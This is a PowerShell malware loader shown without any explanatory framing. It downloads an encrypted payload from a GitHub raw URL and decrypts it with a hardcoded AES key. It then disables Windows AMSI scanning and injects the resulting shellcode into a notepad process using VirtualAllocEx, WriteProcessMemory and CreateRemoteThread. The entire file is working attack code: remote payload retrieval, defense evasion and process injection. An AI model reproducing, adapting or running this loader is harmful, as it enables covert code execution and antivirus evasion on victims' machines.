$url = 'https://raw.githubusercontent.com/Mouted/Hos/main/b64.txt'
$wc = New-Object System.Net.WebClient
$b64 = $wc.DownloadString($url).Trim()
$wc.Dispose()
$enc = [Convert]::FromBase64String($b64)
$key = [byte[]]@(0xF7,0x0E,0x9C,0x34,0xB0,0x05,0x95,0x1E,0xA9,0xA8,0x51,0xDC,0x08,0xFA,0xCA,0x2E,0xFA,0xBF,0x17,0x3A,0xA7,0x95,0xAE,0x51,0xC7,0xF6,0x55,0x14,0xFB,0x70,0x64,0xDB)
$iv  = [byte[]]@(0x42,0x0B,0xD0,0xB0,0x00,0xB6,0xBB,0xF8,0x35,0x44,0x7E,0x2D,0x7E,0x94,0x93,0x6F)
$aes = [System.Security.Cryptography.Aes]::Create()
$aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
$aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
$aes.Key = $key
$aes.IV = $iv
$dec = $aes.CreateDecryptor()
$shellcode = $dec.TransformFinalBlock($enc, 0, $enc.Length)
$dec.Dispose()
$aes.Dispose()

# AMSI Bypass
$w = 'System.Management.Automation.AmsiUtils'
$a = [Ref].Assembly.GetType($w)
$f = $a.GetField('amsiInitFailed','NonPublic,Static')
$f.SetValue($null,$true)

$code = @'
using System;
using System.Runtime.InteropServices;
public class W {
    [DllImport("kernel32.dll")]
    public static extern IntPtr OpenProcess(uint a, bool b, int c);
    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAllocEx(IntPtr a, IntPtr b, uint c, uint d, uint e);
    [DllImport("kernel32.dll")]
    public static extern bool WriteProcessMemory(IntPtr a, IntPtr b, byte[] c, uint d, out IntPtr e);
    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateRemoteThread(IntPtr a, IntPtr b, uint c, IntPtr d, IntPtr e, uint f, out IntPtr g);
    [DllImport("kernel32.dll")]
    public static extern bool CloseHandle(IntPtr a);
}
'@
Add-Type -TypeDefinition $code -Language CSharp

$p = Get-Process notepad -ErrorAction SilentlyContinue | Select-Object -First 1
if ($p -eq $null) {
    Start-Process notepad
    Start-Sleep 2
    $p = Get-Process notepad | Select-Object -First 1
}
$h = [W]::OpenProcess(0x1F0FFF, $false, $p.Id)
if ($h -eq [IntPtr]::Zero) { exit 2 }
$m = [W]::VirtualAllocEx($h, [IntPtr]::Zero, $shellcode.Length, 0x3000, 0x40)
if ($m -eq [IntPtr]::Zero) { exit 3 }
$w = [IntPtr]::Zero
[W]::WriteProcessMemory($h, $m, $shellcode, $shellcode.Length, [ref]$w)
$t = [W]::CreateRemoteThread($h, [IntPtr]::Zero, 0, $m, [IntPtr]::Zero, 0, [ref]$w)
if ($t -eq [IntPtr]::Zero) { exit 4 }
[W]::CloseHandle($t)
[W]::CloseHandle($h)